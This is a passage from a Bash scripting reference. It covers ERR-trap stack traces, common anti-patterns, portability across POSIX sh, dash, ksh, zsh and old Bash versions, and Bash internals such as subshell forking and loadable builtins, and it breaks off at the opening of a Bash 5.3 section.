- Use case: any external dep that touches network, filesystem, or system state.

## 22.15 Stack-trace error reporter

Use this when an unexpected error in a long script needs to be diagnosed
without instrumenting every function call by hand. Bash exposes three
parallel arrays — `FUNCNAME`, `BASH_SOURCE`, and `BASH_LINENO` — that
together describe the live call stack. A small `ERR`-trap handler walks
them and prints a Python-style backtrace, turning "the script died on
line 217" into "the script died at `do_thing` (`lib/work.bash:42`)
called from `main` (`bin/runner:217`)".

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME="${0##*/}"

# stack_trace — print a backtrace of the current call stack to stderr.
#
# Array alignment (the only tricky part):
#   FUNCNAME[i]     — name of frame i; FUNCNAME[0] is this function.
#   BASH_LINENO[i]  — line in BASH_SOURCE[i+1] where FUNCNAME[i] was called.
#   BASH_SOURCE[i]  — file containing FUNCNAME[i].
#
# Frame 0 is always `stack_trace` itself, so start the walk at i=1.
stack_trace() {
  local -i i frames=${#FUNCNAME[@]}
  local -- fn src line

  printf '%s: stack trace (most recent call last):\n' "$SCRIPT_NAME" >&2
  for ((i = frames - 1; i >= 1; i--)); do
    fn=${FUNCNAME[i]}
    src=${BASH_SOURCE[i]:-<unknown>}
    line=${BASH_LINENO[i-1]:-0}
    printf '  at %s (%s:%d)\n' "$fn" "$src" "$line" >&2
  done
}

# err_handler — wired to ERR; prints the failing command, its exit code,
# and a stack trace. Single-quoted on installation so $? and BASH_COMMAND
# are evaluated when the trap fires, not when it is registered.
err_handler() {
  local -i exitcode=$1
  local -- cmd=$2
  local -- src=${BASH_SOURCE[1]:-<unknown>}
  local -i line=${BASH_LINENO[0]:-0}

  printf '%s: error: command %s failed (exit %d) at %s:%d\n' \
    "$SCRIPT_NAME" "${cmd@Q}" "$exitcode" "$src" "$line" >&2
  stack_trace
  exit "$exitcode"
}

trap 'err_handler "$?" "$BASH_COMMAND"' ERR
set -o errtrace            # propagate ERR into functions, subshells, command subs

# --- demo --------------------------------------------------------------
inner() {
  local -- file=$1
  cat -- "$file"           # will fail if $file does not exist
}

outer() {
  inner /no/such/file
}

main() {
  outer
}

main "$@"
```

Sample output when `inner` is called with a missing file:

```
demo: error: command 'cat -- "$file"' failed (exit 1) at lib/work.bash:53
demo: stack trace (most recent call last):
  at main (bin/demo:65)
  at outer (bin/demo:60)
  at inner (lib/work.bash:53)
```

The walking direction matters. The arrays are indexed from
*innermost-first* (frame 0 is the currently executing function), so
walking `i = frames-1 down to 1` prints `main` first and the failing
function last — the same order Python uses, the order operators
expect. The `i-1` offset on `BASH_LINENO` is required because
`BASH_LINENO[i]` records the line of the *caller* of `FUNCNAME[i+1]`,
not of `FUNCNAME[i]` itself; this off-by-one is the single most common
source of broken bash backtraces.

`set -o errtrace` (equivalently `set -E`) is essential. Without it, the
`ERR` trap is *not* inherited by shell functions, command substitutions,
or subshells — so a failure inside `outer` would silently exit without
firing the trap. Adding it costs nothing and ensures every error path
is reported.

**Common bug: trap registered with double quotes.**

```bash
# wrong — $? and $BASH_COMMAND are expanded NOW, when the trap is set,
# capturing 0 and the empty string forever.
trap "err_handler $? $BASH_COMMAND" ERR

# correct — single quotes defer expansion until the trap fires, so the
# real exit code and failing command reach the handler.
trap 'err_handler "$?" "$BASH_COMMAND"' ERR
```

**See also**: §13.12 for the full discussion of error reporting,
trap-DEBUG vs trap-ERR, and integrating backtraces with logging
frameworks. BCS0603 (trap handling) and BCS0601 (exit on error) for
the rule-level statements; BCS1207 covers the related `PS4` debugging
pattern that uses the same `FUNCNAME`/`BASH_SOURCE` arrays.

## 22.16 Self-test mode (dual-purpose script)

A script that runs as a script when invoked directly and as a library when sourced.

```bash
if (( ${#BASH_SOURCE[@]} == 1 )); then
  main "$@"
fi
```

- Detects whether sourced (length > 1) or executed (length == 1).
- Run `main` only when executed directly.
- Allows the same file to be sourced for testing of its functions.
- Alternative: `[[ ${BASH_SOURCE[0]} == "$0" ]]` (less reliable in subtle cases).
- BCS template includes this pattern.

## 22.17 Anti-patterns catalogue

Patterns that appear in legacy code and should not be perpetuated.

- `[ $var = "x" ]` — unsafe; use `[[ $var == x ]]`.
- `for f in $(ls)` — breaks on filenames with spaces; use a glob or `find -print0 | mapfile`.
- `cmd > file 2>&1` vs `cmd 2>&1 > file` — order matters; the second is wrong if you intend both to go to the file.
- `((count++))` under `set -e` with `count=0` — the post-increment returns 0, triggering errexit; use `count+=1` or `((++count))`.
- `cmd | while read line; do …; done` — loop runs in subshell; outer scope unaffected; use `< <(cmd)` or `lastpipe`.
- `command -v cmd >/dev/null` — correct; `which cmd` — wrong, varies across systems and produces output even when not found.
- `eval "$user_input"` — direct injection; never.
- `` `cmd` `` (backticks) — deprecated; use `$(cmd)`.
- `[ a = "$b" ]` — unsafe if `$b` contains `-` or `=`; use `[[ ]]`.
- `read line` (no `-r`) — interprets backslash; use `read -r`.
- `IFS=… ; cmd ; IFS=…` — leaks if `cmd` exits early; scope IFS in a subshell or restore in trap.
- `if [ $? -eq 0 ]` — racy; use `if cmd; then …`.
- `local file=$(cmd)` — `local` is a builtin returning 0, masking `$(cmd)`'s exit; declare and assign separately.
- `echo -e "..."` — non-portable; use `printf '%b\n'` or `$'...'`.
- `cd $dir && cmd` — fails open if `cd` fails; use `cd "$dir" || die`.
- `cat file | wc -l` — useless cat; `wc -l < file` or `wc -l file`.
- `function name()` — redundant `function` keyword; just `name()`.
- `${1}` everywhere when `$1` would do — but `${var}foo` *does* need braces.
- `if grep -q pattern file; then` — fine, but `if [[ $(grep -c pattern file) -gt 0 ]]` — wasteful; the first form is right.

# Part XXIII — POSIX Conformance and Portability

*When and how to write code that runs on more than just Bash. Most production code does not need to be portable; some does. This Part documents the trade-offs.*

---

---

## 23.1 Bash vs POSIX sh

The features bash adds beyond POSIX 1003.2 / SUSv4.

- Arrays (indexed and associative).
- `[[ ]]` conditional command.
- `(( ))` arithmetic command.
- `=~` regex.
- `$(< file)` (not POSIX; `cat <file` is).
- `let` builtin.
- `local` (POSIX has no scoping).
- `declare` / `typeset` and attributes.
- `mapfile` / `readarray`.
- Process substitution `<(…)`, `>(…)`.
- Brace expansion `{1..10}`.
- `**` globstar.
- `+=` operator.
- `${var//pat/repl}` and other expansions beyond POSIX.
- ANSI-C `$'...'` quoting.

## 23.2 The bashisms list

Specific constructs that fail in `dash` / POSIX `sh`.

- `[[ ]]` — sh has only `[ ]`.
- `local` — sh has no scoping.
- Arrays — sh has none.
- `function` keyword — sh requires `name()`.
- `$'...'` — sh has only `'…'`.
- `<<<` — sh has only `<<`.
- `read -r ARRAY` — sh has no array.
- `==` in `[[`/`[` — sh prefers `=`.
- `&>` — sh requires `>file 2>&1`.
- `pipefail` — sh has none (POSIX 2024 adds it).
- `checkbashisms` tool from `devscripts` — Debian's auditor.

## 23.3 Bash vs dash

`dash` is the **D**ebian **A**lmquist **SH**ell, used as `/bin/sh` on
Debian, Ubuntu, and most of their derivatives. It is deliberately small,
deliberately POSIX-only, and deliberately fast — typically 5–10× faster
to start than bash. The tradeoff is that nearly every modern bash
convenience is missing: no arrays, no `[[ ]]`, no `local` declarations
beyond the single keyword, no `$'...'`, no process substitution, no
brace expansion of lists.

A bash script with `#!/bin/bash` always runs under bash regardless of
what `/bin/sh` points at, so the dash-vs-bash question is only ever
relevant when:

- writing a script with `#!/bin/sh` (init scripts, systemd `ExecStart=`
  shell snippets, container entry-points, `postinst` hooks);
- sourcing a config file (e.g. `/etc/default/foo`) from a sh-style
  context;
- distributing a script that must run on minimal images (Alpine
  defaults `/bin/sh` to BusyBox ash, similarly POSIX-only).

For everything else, write bash. The dash-portable subset is a
deliberate constraint, not an accidental one.

### checkbashisms — the Debian auditor

The `checkbashisms` script (Debian package `devscripts`) scans a script
for constructs that work in bash but fail in dash. It is the standard
test for "is this `#!/bin/sh` script actually portable?"

```text
# scenario: audit an /etc/init.d script before shipping
$ checkbashisms /etc/init.d/myservice
possible bashism in /etc/init.d/myservice line 14 (echo -e):
  echo -e "starting myservice\n"
possible bashism in /etc/init.d/myservice line 22 ([[ )):
  if [[ -f /var/run/myservice.pid ]]; then
possible bashism in /etc/init.d/myservice line 31 ($' ):
  printf $'\t%s\n' "$pid"
```

`checkbashisms -p` is stricter (flags POSIX-undefined behaviour even
where it happens to work in dash); `-x` follows `.` (dot) sources.

### A worked dash-vs-bash failure

The classic case is `[[`: bash users instinctively reach for it; dash
treats `[[` as a syntax error because there is no such builtin.

`script.sh`:

```bash
#!/bin/sh
file=/etc/passwd
if [[ -f "$file" ]]; then
  echo found
fi
```

```text
$ bash script.sh
found

$ dash script.sh
script.sh: 3: [[: not found
```

Other common dashisms-by-accident: `local var=value` works (one keyword,
one assignment) but `local -i n=0` does not (dash has no `-i`); `read -r
-a arr` fails because dash has no arrays; `${var,,}` lowercase expansion
is a syntax error; `function name() { ... }` parses but only with the
`name()` form, not the `function` keyword.

The simplest defensive measure is to declare intent in the shebang.
`#!/bin/sh` means "I claim this is portable" and invites
`checkbashisms`. `#!/bin/bash` (or `#!/usr/bin/env bash`) means "I'm
using bash features deliberately" and exempts the script from the
portable subset.

**See also**: §23.1 (Bash vs POSIX sh) for the underlying spec; §23.2
(bashisms list) for the catalogue checkbashisms is checking against;
BCS0102 (shebang) for the BCS shebang convention.

## 23.4 Bash vs ksh

Korn shell variants.

- `ksh88` — POSIX baseline, widely deployed historically.
- `ksh93` — feature-rich, ahead of bash on some features (associative arrays since 1993).
- `mksh` (MirBSD ksh) — pdksh successor; on Android, OpenBSD.
- ksh has discipline functions, type system, floating point — bash does not.
- Some idioms differ: `print` vs `printf`, `read -A` vs `read -a`.

## 23.5 Bash vs zsh

`zsh` is interactive-rich and scripting-divergent. Apple ships it as
the default login shell on macOS, and it has a substantial fan base on
Linux for daily use. As a *scripting* target, however, it is a separate
language wearing similar clothing: the same `if`/`for`/`case`, the same
`$(…)`, the same `[[ … ]]` — but with enough differences in defaults
that running a bash script under `zsh -c …` is a guaranteed surprise.

The two divergences that bite scripters most often are word-splitting
defaults and array indexing.

### Word-splitting contrast

Bash splits unquoted parameter expansions on `IFS`. zsh, by default,
does not — it expands them as a single word. This is one of zsh's most
deliberately user-friendly choices, and the most reliably confusing one
when porting:

```bash
# scenario: bash splits unquoted; zsh would not (this block runs under bash)
list='red green blue'

# shellcheck disable=SC2086  # word-splitting is the demo
for x in $list; do printf '[%s]\n' "$x"; done
# ⇒ [red]
# ⇒ [green]
# ⇒ [blue]
# (the equivalent loop in zsh 5.9 with default options would print
#  the single line `[red green blue]` — zsh does not split unquoted
#  parameter expansions)
```

A bash script that loops over `$list` and silently produces one
iteration under zsh is the canonical port-failure. Re-enable bash-style
splitting with `setopt SH_WORD_SPLIT`, or always quote and split
explicitly with arrays:

```bash
# bash-and-zsh portable: use an array, no implicit splitting
declare -a list=(red green blue)
for x in "${list[@]}"; do printf '[%s]\n' "$x"; done
# ⇒ [red]
# ⇒ [green]
# ⇒ [blue]
# (same output under bash and zsh — quoted "${arr[@]}" is the portable form)
```

### Array indexing — KSH_ARRAYS

zsh arrays are **1-indexed by default**. `arr[1]` is the first element;
`arr[0]` is empty. Bash arrays are 0-indexed (inherited from ksh88's
later behaviour). The `KSH_ARRAYS` option forces zsh into 0-indexed,
bash-compatible mode:

```text
# zsh, default options (illustrative — `print` and `setopt` are zsh builtins)
arr=(red green blue)
print -- "$arr[1]"           # → red       (1-indexed)
print -- "$arr[0]"           # →           (empty)
print -- "${#arr[@]}"        # → 3

# zsh with KSH_ARRAYS enabled
setopt KSH_ARRAYS
print -- "${arr[0]}"         # → red       (0-indexed, like bash)
print -- "${arr[1]}"         # → green
```

`KSH_ARRAYS` also forces braces around any subscripted reference (zsh
otherwise allows the bareword `$arr[1]`), bringing the surface syntax
closer to bash. It is the single most useful zsh setopt for "make this
script bash-shaped."

### Other differences worth noting

- **Globbing.** zsh has glob qualifiers (`*(.)` for plain files,
  `*(/)` for directories) and recursive globs (`**/*.c`) without
  needing `globstar`. bash's `**` matches directories only with
  `shopt -s globstar`.
- **`function` keyword.** zsh accepts both `function name { … }` and
  `name() { … }`; bash too, but with subtle differences in alias
  handling.
- **Redirection.** zsh's MULTIOS option lets `>file1 >file2` write to
  both; bash uses only the last redirection.
- **`read`.** bash's `read -a arr` reads a whole line into an array;
  zsh uses `read -A arr`.

### Practical advice

Many bash idioms break under zsh; many zsh idioms break under bash. For
shared `~/.profile` or `~/.bashrc.local` files sourced from both, code
defensively against both unset/unset-or-empty differences in parameter
expansion, and never rely on word-splitting of unquoted variables. For
scripts, pick a shell in the shebang (`#!/bin/bash` or `#!/bin/zsh`)
and write to that target — there is no point pretending the same script
runs cleanly under both.

**See also**: §23.1 (Bash vs POSIX sh) for the underlying spec; §23.2
(bashisms list); BCS0102 (shebang) for the BCS shebang convention;
BCS0206 (arrays) for the bash-side array discipline.

## 23.6 Bash 3.2 on macOS

Apple ships bash 3.2 (2007). Macs have used `zsh` as default since macOS Catalina.

- macOS `/bin/bash` is 3.2 — no associative arrays, no `mapfile`, no namerefs.
- Users install bash 5 via Homebrew: `/opt/homebrew/bin/bash` or `/usr/local/bin/bash`.
- Scripts that target Mac users need to choose: support 3.2, or require Homebrew bash.
- Most modern scripts require 4.0+ or 5.0+.

## 23.7 BSD `sh`

FreeBSD, OpenBSD, NetBSD use various `sh` implementations.

- FreeBSD: `ash` derivative.
- OpenBSD: `pdksh` (more capable; effectively ksh88).
- All POSIX-compliant; few extensions.
- For cross-BSD portability, restrict to POSIX.

## 23.8 `--posix` mode

Bash's POSIX-conformance mode.

- Activated by `bash --posix` or `set -o posix`.
- Disables many bash extensions.
- Used to test POSIX compliance.
- Not a deployment target — POSIX-mode bash is still bash, not `sh`.

## 23.9 `shopt` compatibility levels

Bash supports limited backward compatibility via `shopt -s compatNN`.

- `compat31`, `compat32`, … `compat51` — emulate that version's behaviour.
- Used for legacy scripts that depend on quirks.
- BCS recommends not using these — fix the script.
- Removed: bash 5.2+ may drop the oldest levels.

## 23.10 When to write portable sh

Cases where POSIX-only is the right choice.

- `/bin/sh` scripts in OS init / packaging.
- Build scripts that run before bash is available.
- Embedded systems with only ash/dash.
- Legacy Unix support.
- Most cases: write bash, require bash, document the requirement.

## 23.11 Forward-compatibility hygiene

Writing bash that won't break in future versions.

- Test with `BASH_COMPAT=` unset (modern semantics).
- Avoid relying on undocumented behaviour.
- Watch the bash release notes (NEWS file).
- Keep up with deprecations: backticks, `$[…]`, `expr`.
- Don't depend on `lastpipe` being on/off — set it explicitly.

## 23.12 Targeting multiple Bash versions

Most BCS-aligned scripts simply require bash 5.2 or later and refuse to
run otherwise. That is the cleanest stance: declare the requirement,
fail fast, document in the header. Only when a script is intended for
distribution across mixed estates (RHEL 8 with bash 4.4, CentOS 7 with
bash 4.2, the macOS bash 3.2 problem in §23.6) does
multi-version-targeting become a real concern — and even then, the
right answer is usually "raise the floor."

### Detect with `BASH_VERSINFO`

`BASH_VERSINFO` is an array exposing major/minor/patch/build/release/
machine. Index 0 is the major version; index 1 is the minor.

```bash
# scenario: refuse to run on bash older than 4.4 (early-die pattern)
if (( BASH_VERSINFO[0] < 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 4) )); then
  printf '%s: requires bash 4.4 or later (have %s)\n' \
    "$0" "${BASH_VERSION:-unknown}" >&2
  exit 18
fi
```

Exit code 18 is BCS-canonical for "missing dependency" (Appendix L).
Place this check at the very top of the script, immediately after the
shebang and `set -euo pipefail`, so that the failure happens before the
script touches anything bash-4.4-specific.

### Conditional feature use

Where a script would benefit from a newer feature but can degrade to an
older one, gate the use:

```bash
# scenario: use namerefs (declare -n, bash 4.3+) when available, fall
# back to eval-by-name on older bash
copy_array() {
  local -- src_name=$1 dst_name=$2
  if (( BASH_VERSINFO[0] > 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] >= 3) )); then
    local -n src=$src_name dst=$dst_name
    dst=("${src[@]}")
  else
    eval "$dst_name=(\"\${${src_name}[@]}\")"
  fi
}
```

The fallback branch is more dangerous than the primary, so the version
gate also serves as a security boundary: shipping a script that always
took the `eval` branch would be worse hygiene than refusing to run on
old bash at all. This is one reason "raise the floor" is usually the
better strategy.

### Document the floor

Every BCS script should say *somewhere near the top* what version it
needs. The `# Requires bash 4.4+` line is part of the script's contract
with its operators; the runtime check is the enforcement mechanism that
backs it up.

```bash
#!/usr/bin/env bash
# myscript — Brief description.
#
# Requires bash 5.2+ (uses globskipdots, varredir_close, BASH_REMATCH
# semantics changed in 5.0, and `wait -p` from 5.0).
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Hard floor — fail before touching anything version-specific.
if (( BASH_VERSINFO[0] < 5 || (BASH_VERSINFO[0] == 5 && BASH_VERSINFO[1] < 2) )); then
  printf '%s: requires bash 5.2+ (have %s)\n' "${0##*/}" "$BASH_VERSION" >&2
  exit 18
fi
```

### Polyfilling — usually not worth it

Writing a function that simulates a missing feature (e.g. an `mapfile`
emulator for bash 3.2 on macOS) is technically possible and almost
always a mistake. The polyfill is slower, less robust, and one more
piece of code to maintain. If the script must run on macOS's stock
shell, switch the shebang to `#!/usr/bin/env bash` and document that
users install bash 5 via Homebrew (`brew install bash`); do not pretend
bash 3.2 is bash 5.

**See also**: §23.6 (Bash 3.2 on macOS) for the most common
multi-version scenario; §23.4 (Bash vs ksh) for the older-bash adjacent
target; Appendix M (Bash version history) for the per-version feature
matrix; Appendix L (exit codes) for code 18; BCS0409 (Bash version
detection) for the canonical version-gate pattern.

# Part XXIV — Bash Internals

*How bash actually works. This Part is for advanced readers who want to understand semantics by understanding the implementation.*

---

---

## 24.1 The execution pipeline

The high-level path from input string to syscalls inside the bash
interpreter. Every command bash runs walks through these ten stages,
in order; understanding the order explains why a bug at one stage
cannot be papered over at another.

1. **Tokeniser** — produces tokens from input characters. Reserved
   words (`if`, `for`), operators (`||`, `<<`), and word boundaries are
   recognised here.
2. **Parser** — produces an AST from tokens via the bison grammar in
   `parse.y`. Syntax errors surface here, before any expansion.
3. **Word expansion** — brace, tilde, parameter, arithmetic, command,
   and process substitution, in that left-to-right order.
4. **Word splitting** — applies on unquoted results of step 3, using
   `IFS`. Quoted expansions skip this stage.
5. **Pathname expansion** — globbing (`*`, `?`, `[…]`, `**`) on
   unquoted results.
6. **Quote removal** — strips the quotes that survived steps 3–5.
7. **Redirection setup** — `<`, `>`, `>>`, `<<<`, `<()` connect file
   descriptors before the command runs.
8. **Execution dispatch** — picks one of: builtin, function, alias
   (interactive only), keyword, or external command (fork+exec).
9. **Wait for completion** — synchronous unless backgrounded with `&`.
10. **Trap delivery** — pending signals delivered between commands;
    DEBUG/RETURN/ERR pseudo-traps fire at the appropriate boundary.

### A worked xtrace transcript

`set -x` shows a snapshot of stages 6–7 (after expansion and quote
removal, before dispatch). Reading an xtrace line backwards through the
pipeline anchors each stage to something concrete:

```bash
$ bash -c 'set -x; x=hello; echo "$x" $(date +%Y) /etc/host*'
+ x=hello                        # step 8: builtin assignment
+ date +%Y                       # step 3 (command sub): inner command
+ echo hello 2026 /etc/hostname /etc/hosts
#                ^^^^                 ^step 5: pathname expansion of /etc/host*
#           ^step 3: command-sub result substituted
#      ^step 6: "$x" → hello (quotes removed after expansion)
# ^step 8: echo dispatched as a builtin
```

Every word visible in the `+ echo …` line has already passed through
expansion (3), splitting (4), pathname expansion (5), and quote removal
(6). What you see in xtrace is the input to dispatch — which is why
debugging by `set -x` only shows you problems at stage 8 onward and is
useless for diagnosing brace-expansion bugs at stage 3.

`set -v` is the complement: it prints each line *before* expansion, so
the two together (`set -xv`) bracket the pipeline. The classic
diagnostic for "is this a quoting bug or a dispatch bug?" is to enable
both and watch the same line appear twice — first verbatim from `-v`,
then post-expansion from `-x`.

```text
$ bash -c 'set -xv; for f in *.txt; do echo "$f"; done' 2>&1 | sed 's/^/| /'
| + set -xv
| for f in *.txt; do echo "$f"; done    # -v: pre-expansion
| + for f in a.txt b.txt                # -x: post-expansion (stage 5)
| + echo a.txt
| a.txt
| + echo b.txt
| b.txt
```

### Why the order matters

A subtlety that catches people: word splitting (stage 4) happens *after*
expansion (stage 3). So `arr=(1 2 3); echo $arr[@]` does not iterate the
array — bash expands `$arr` to "1" first, then sees the literal `[@]`.
Quoting rescues nothing; the bug is upstream. The fix is `${arr[@]}` so
the expansion in stage 3 picks up the array.

Another: pathname expansion (stage 5) does *not* happen inside `[[ … ]]`
(it is a keyword, parsed at stage 2 with its own evaluation rules) but
*does* happen inside `[ … ]` (a builtin, evaluated at stage 8 with stage
3–6 word processing applied to its arguments). This is one of the
several reasons `[[ … ]]` is preferred under BCS.

**See also**: §24.2 (the bison grammar — stage 2 details); §13.x (the
expansion family — stages 3–5); BCS0207 (parameter expansion) for the
practical guidance that follows from the pipeline order.

## 24.2 The bison grammar

Bash 5.2 rewrote the command-substitution parser using a recursive bison grammar.

- Pre-5.2: ad-hoc parsing in C; subtle bugs around nesting and quoting.
- Bash 5.2: full bison grammar; cleaner, more correct.
- Files in source tree: `parse.y`, `subst.c`.
- Reading the grammar: bison `parse.y` is the canonical reference.
- Implications: bash 5.2 accepts some constructs that older bash rejected, and vice versa.

## 24.3 Variable storage

Bash maintains variables in a hash table, scoped by call stack.

- One global variable table.
- Per-function local-variable tables.
- Lookup: walk from innermost scope outward.
- Hash table: open addressing, linear probing.
- Variable record: name, value, attributes (`-i`, `-a`, etc.), reference count.
- Performance: `O(1)` average; `O(N)` worst case under collision.

## 24.4 Function storage

Functions are stored similarly to variables, in their own table.

- One global function table; no scoped tables.
- A function defined inside a function is still global.
- `unset -f` removes by name.
- `declare -f` lists with bodies.
- Source location tracked when `extdebug` is enabled.

## 24.5 The job table

Per-shell table of jobs.

- Each entry: job number, PID(s), state (Running, Stopped, Done), command text.
- Built when job control is on.
- Subshells start with empty job table.
- Garbage-collected: entries removed once status is reported.

## 24.6 The trap table

Per-shell table mapping signals to handler strings.

- Indexed by signal number.
- Inherited at fork; reset (for caught signals) at exec.
- `trap` builtin reads/writes this table.
- Pseudo-signals (EXIT, ERR, DEBUG, RETURN) have separate slots.

## 24.7 The execution environment

The bundle of state that defines a command's runtime context.

- Variables.
- Functions.
- File descriptors.
- Traps.
- Working directory.
- Umask.
- Signal mask.
- Resource limits.
- Subshells inherit (almost) everything; some elements reset (caught signals, DEBUG/ERR/RETURN traps without `-T`/`-E`).

## 24.8 Subshell forking

When bash needs a subshell — an explicit `( … )` group, a command
substitution `$(…)`, the upstream stages of a pipeline (without
`shopt -s lastpipe`), or `&` for background execution — it calls
`fork(2)`. The child inherits a copy-on-write view of the parent's
address space, the parent's open file descriptors, and a near-complete
snapshot of shell state.

What the child gets:

- **Memory** (copy-on-write): all variables, functions, internal state.
- **Open file descriptors**: inherited as references to the same
  kernel-side `struct file` — writes to the same fd from parent and
  child interleave at the kernel.
- **Signal handlers**: inherited as set in the parent. Caught signals
  reset to default if the child later `exec`s a new program.
- **Process group**: depends on whether the subshell is part of a
  pipeline (each pipeline stage gets its own pgid by default in
  job-control mode) or a plain background job.
- **Environment**: the parent's environment becomes the child's
  environment.

The implication that traps users repeatedly: **subshell variable
changes are local to the subshell**. The parent never sees them. This
is why `$(…)` cannot return values via assignment; it can only return
them via stdout. Bash 5.3 introduces `${ cmd; }` no-fork command
substitution to break this rule on purpose (§25.1) — but for everything
through 5.2, the rule is absolute.

### A `BASHPID` / `BASH_SUBSHELL` demo

`$$` is the **parent shell's PID**. It does *not* update inside a
subshell. `BASHPID` (bash 4.0+) is the PID of the current shell —
parent or subshell — and it does. `BASH_SUBSHELL` is a counter that
increments each time a new subshell is entered, with 0 in the
top-level shell.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

printf 'top:        $$=%d  BASHPID=%d  BASH_SUBSHELL=%d\n' \
  $$ "$BASHPID" "$BASH_SUBSHELL"

(
  printf 'subshell-1: $$=%d  BASHPID=%d  BASH_SUBSHELL=%d\n' \
    $$ "$BASHPID" "$BASH_SUBSHELL"
  (
    printf 'subshell-2: $$=%d  BASHPID=%d  BASH_SUBSHELL=%d\n' \
      $$ "$BASHPID" "$BASH_SUBSHELL"
  )
)

# Same effect inside a command substitution:
who=$(printf 'cmdsub:     $$=%d  BASHPID=%d  BASH_SUBSHELL=%d\n' \
  $$ "$BASHPID" "$BASH_SUBSHELL")
printf '%s' "$who"
```

Typical output (PIDs differ each run):

```
top:        $$=12345  BASHPID=12345  BASH_SUBSHELL=0
subshell-1: $$=12345  BASHPID=12346  BASH_SUBSHELL=1
subshell-2: $$=12345  BASHPID=12347  BASH_SUBSHELL=2
cmdsub:     $$=12345  BASHPID=12348  BASH_SUBSHELL=1
```

`$$` is constant; `BASHPID` reflects the actual process; `BASH_SUBSHELL`
counts nesting depth. Use `BASHPID` for tempfile names that must be
unique per-subshell (otherwise concurrent subshells of the same parent
collide on `$$`). Use `BASH_SUBSHELL` to detect *that* you are in a
subshell — useful for traps that should run only at top level.

### Variable assignment scoping

The single most common subshell-forking surprise:

```bash
# wrong — pipe creates a subshell; count never updates in the parent
declare -i count=0
printf '%s\n' a b c | while read -r line; do
  count+=1
done
printf 'count=%d\n' "$count"
# ⇒ count=0 (the right-hand `while` ran in a subshell of the pipeline)

# right — process substitution keeps the loop in the parent shell
declare -i count=0
while read -r line; do
  count+=1
done < <(printf '%s\n' a b c)
printf 'count=%d\n' "$count"
# ⇒ count=3
```

Or, equivalently, `shopt -s lastpipe` makes the *last* pipeline stage
run in the parent shell (with the subtle caveat that it works only in
non-interactive bash). BCS prefers process substitution (§5.4) because
the scoping is unambiguous.

**See also**: §22.x (idioms cookbook) for the BASHPID-in-tempfile-name
pattern; §17.x (IPC) for shared-fd semantics across subshells; §6.16
(`shopt lastpipe`) for the partial workaround; §25.1 for the bash 5.3
no-fork escape hatch; BCS0202 (variable scoping) for the function-vs-
subshell distinction in BCS-aligned scripts.

## 24.9 Builtin loadables

Bash supports loading additional builtins from shared objects at
runtime. The mechanism turns a `.so` file with the right symbols into a
new builtin command, indistinguishable from the ones compiled into bash
itself: same dispatch path, same speed, no fork/exec cost. The bash
distribution ships ~30 stock loadables in `examples/loadables/`; many
distros package these and install them under `/usr/lib/bash/` (Debian,
Ubuntu) or `/usr/local/lib/bash/` (Homebrew, source builds).

Use cases:

- replacing a hot-path external (`sleep`, `mkdir`, `realpath`, `head`,
  `tee`) with a fork-free builtin;
- exposing a syscall bash does not normally provide (`mkfifo`, `head`,
  `print`);
- one-off performance-critical operations where the per-fork cost
  dominates the actual work.

### Loading a stock loadable

`enable -f /path/to/builtin.so name` registers the loadable as a
builtin called `name`. After that, `name args…` runs through the
builtin dispatch path with no fork.

```bash
# scenario: replace the `sleep` external with the loadable on Ubuntu
enable -f /usr/lib/bash/sleep sleep
# Now `sleep 0.1` is a builtin call — no /bin/sleep fork+exec.

# Same for mkdir:
enable -f /usr/lib/bash/mkdir mkdir
mkdir -p /tmp/builtin-demo

# Same for realpath:
enable -f /usr/lib/bash/realpath realpath
realpath /etc/hosts
# ⇒ /etc/hosts
```

`enable -d name` removes the loadable; `enable -f -d /path/to/foo.so
name` is the explicit unload form. `enable -p` lists every builtin
currently enabled, marking external loadables with their path. `enable
-n name` disables a builtin without removing it (useful in defensive
testing — "ensure the script works even if `sleep` is the external").

The performance gap matters most in tight loops. A microbench on a
modern Linux box: 10 000 iterations of the external `sleep 0` runs in
~3 s (almost entirely fork/exec); 10 000 iterations of the loadable
`sleep 0` runs in ~0.05 s. For scripts that sleep on every iteration
of a polling loop, the loadable shaves real time off real workloads.

### Where the .so files live

Distribution-dependent. Common paths on a typical Linux install:

- **Debian / Ubuntu**: `/usr/lib/bash/` (`bash-builtins` package)
- **Fedora / RHEL**: `/usr/lib64/bash/` or none (compile from
  `bash-source`)
- **macOS Homebrew**: `$(brew --prefix)/lib/bash/`
- **Source build**: `/usr/local/lib/bash/`

`pkg-config --variable=loadablesdir bash` returns the canonical path
when bash is built with pkg-config metadata.

### Writing your own

A loadable is C source compiled with bash's `builtins.h` interface and
linked against `libbash`. The bash source tree's `examples/loadables/`
directory contains 30+ examples ranging from trivial (`hello.c`) to
useful (`mkfifo.c`, `seq.c`). The compile invocation is approximately:

```bash
gcc -fPIC -shared -o myhello.so \
  -I/usr/include/bash -I/usr/include/bash/builtins -I/usr/include/bash/include \
  myhello.c
```

The build is sufficiently fragile across bash-versions and distros that
the practical advice is: **use the stock loadables**, and if you need
something custom, factor it as an external program rather than as a
loadable. The loadable interface is not a stable ABI, and a script that
depends on a custom loadable becomes binary-coupled to a specific bash
version.

### `--enable-loadable-builtins`

Some bash builds (particularly Alpine's BusyBox-derived environments
and some hardened distros) ship without loadable-builtin support. The
`./configure --enable-loadable-builtins` flag at build time controls
this. `enable -f` returns "dynamic loading not available" when the
support is missing.

**See also**: §24.10 (reading the bash source) for `examples/loadables/`
in the upstream tree; §22.14 (mock-friendly subprocess wrapper) for the
contrasting "swap out an external" idiom that does not require
loadables; BCS1002 (PATH security) for the discussion of why builtin
dispatch is preferable on the security axis as well as the performance
axis.

## 24.10 Reading the bash source

For deep understanding, the canonical resource is the bash source itself.

- Repository: `https://git.savannah.gnu.org/cgit/bash.git/`.
- Key files: `parse.y` (grammar), `subst.c` (expansion), `execute_cmd.c` (execution), `variables.c` (variable management), `jobs.c` (job control).
- Build from source: `./configure && make`.
- Comments are dense but informative.
- The bash maintainer (Chet Ramey) is responsive on the bug-bash mailing list.

# Part XXV — Bash 5.3 and the Future

*Bash continues to evolve. This Part documents Bash 5.3 (released 2025) and looks at upstream signals about future releases.*

---

---

## 25.1 No-fork command substitution `${ cmd; }`

The headline feature of Bash 5.3. The traditional `$(cmd)` form runs
